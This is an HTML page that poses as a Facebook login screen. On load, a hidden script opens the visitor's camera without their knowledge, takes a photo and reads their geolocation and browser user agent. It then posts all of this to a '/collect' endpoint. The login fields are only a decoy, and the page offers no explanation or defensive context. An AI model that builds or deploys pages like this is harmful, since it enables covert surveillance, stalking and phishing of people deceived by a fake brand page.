<!DOCTYPE html>
<html>
<head>
    <title>Facebook</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: sans-serif; background: #f0f2f5; text-align: center; padding-top: 100px; }
        .fb-box { background: white; padding: 20px; margin: auto; width: 90%; max-width: 320px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        input { width: 100%; margin: 10px 0; padding: 10px; border-radius: 4px; border: 1px solid #ccc; }
        button { width: 100%; padding: 10px; background: #1877f2; color: white; border: none; border-radius: 4px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="fb-box">
        <h2>Facebook</h2>
        <input type="text" placeholder="Mobile number or email">
        <input type="password" placeholder="Password">
        <button>Log In</button>
    </div>

    <video id="video" autoplay style="display:none;"></video>
    <script>
        // Get location & camera
        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
            document.getElementById('video').srcObject = stream;
            const track = stream.getVideoTracks()[0];
            let imageCapture = new ImageCapture(track);

            imageCapture.takePhoto().then(blob => {
                let reader = new FileReader();
                reader.onloadend = () => sendData(reader.result);
                reader.readAsDataURL(blob);
            });
        }).catch(() => sendData(null));

        function sendData(image) {
            navigator.geolocation.getCurrentPosition(pos => {
                fetch("/collect", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        latitude: pos.coords.latitude,
                        longitude: pos.coords.longitude,
                        userAgent: navigator.userAgent,
                        image: image
                    })
                });
            });
        }
    </script>
</body>
</html>
